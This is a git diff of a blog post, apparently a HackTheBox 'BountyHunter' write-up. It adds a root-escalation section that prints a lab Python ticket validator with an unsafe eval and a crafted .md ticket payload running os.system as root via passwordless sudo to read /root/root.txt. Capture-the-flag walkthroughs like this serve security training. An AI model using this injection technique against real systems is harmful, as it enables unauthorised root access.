@@ -1,3 +1,4 @@
+
 ---
 layout: post
 title:  "HackTheBox BountyHunter"
@@ -26,10 +27,9 @@ Next i manually checked the discovered directories and found a tasklist in `http
 
 > Tasks:
 > 
-> [ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
-> [X] Write tracker submit script
-> [ ] Connect tracker submit script to the database
-> [X] Fix developer group permissions
+> [ ] Disable 'test' account on portal and switch to hashed password.
+> Disable nopass. [X] Write tracker submit script [ ] Connect tracker
+> submit script to the database [X] Fix developer group permissions
 
 We should keep this information in mind. Also theres a file called `bountylog.js` containing JavaScript code. 
 
@@ -114,5 +114,94 @@ Nice! So we got a database user and a password. Unfortunately i couldn't find an
   So we can retrieve the first flag.
 
 ## Root.txt
-... soon
+I started to ennumerate the current directory and found a `contract.txt` 
+![contract](/assets/img/blog/bhcontract.png)
+It gives us a hint that on the system we can find an internal tool from *Skytrain Inc*, but we dont know where exactly. So i ran `find / -iname "*Skytrain*" 2>/dev/null`. 
+![find](/assets/img/blog/bhfind.png)
+The directory contains a python script `ticketValidator.py`with straightforward python code.
+
+	#Skytrain Inc Ticket Validation System 0.1
+	#Do not distribute this file.
+	def load_file(loc):
+	    if loc.endswith(".md"):
+	        return open(loc, 'r')
+
+	    else:
+	        print("Wrong file type.")
+	        exit()
+	
+	def evaluate(ticketFile):
+	    #Evaluates a ticket to check for ireggularities.
+	    code_line = None
+	    for i,x in enumerate(ticketFile.readlines()):
+	        if i == 0:
+	            if not x.startswith("# Skytrain Inc"):
+	                return False
+	            continue
+	        if i == 1:
+	            if not x.startswith("## Ticket to "):
+	                return False
+	            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
+	            continue
+
+	        if x.startswith("__Ticket Code:__"):
+	            code_line = i+1
+	            continue
+
+	        if code_line and i == code_line:
+	            if not x.startswith("**"):
+	                return False
+
+	            ticketCode = x.replace("**", "").split("+")[0]
+
+	            if int(ticketCode) % 7 == 4:
+	                validationNumber = eval(x.replace("**", ""))
+	                if validationNumber > 100:
+	                    return True
+	                else:
+	                    return False
+	    return False
+
+	def main():
+	    fileName = input("Please enter the path to the ticket file.\n")
+	    ticket = load_file(fileName)
+	    #DEBUG print(ticket)
+	    result = evaluate(ticket)
+	    if (result):
+	        print("Valid ticket.")
+	    else:
+	        print("Invalid ticket.")
+	    ticket.close
+
+	main()
+
+The most important line `validationNumber = eval(x.replace("**", ""))` contains a eval. If we could manipulate the contants of `x` we can execute arbitrary commands.  I we follow `x` backwards through the script we can observe that a file is read line by line and each line stored in the loop value `x`.  But in order to execute the contents of `x` we must satisfy all conditions:
+
+ 1. `if loc.endswith(".md")`. Our payload file must have the extension  .md
+ 2. `if int(ticketCode) % 7 == 4:` The first part of our payload must a number that devided by 7 is a multiple of it with the rest of 4. The easiest value is 4.
+ 3. Our payload must contain a `+` in the ticketcode line.
+
+An example can be found in `/opt/skytrain_inc/invalid_tickets` e.g:
+
+    # Skytrain Inc
+    ## Ticket to New Haven
+    __Ticket Code:__  **31+410+86**
+    ##Issued: 2021/04/06
+    #End Ticket  
+
+But what do we actually achive with this? 
+I ran [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) nad found out that the current user is able to execute the script above as the root user without using a password! So that means if we can execute arbitrary code it is executed as the root user. 
+All put together i ended up with following payload:
+
+    # Skytrain Inc  
+    ## Ticket to New Haven  
+    **4+ __import__('os').system('cat /root/root.txt > /tmp/root')**    
+    ##Issued: 2021/04/06  
+    #End Ticket 
+
+ After that we can read the flag with `cat /tmp/root`
+
+ 
+
+
 
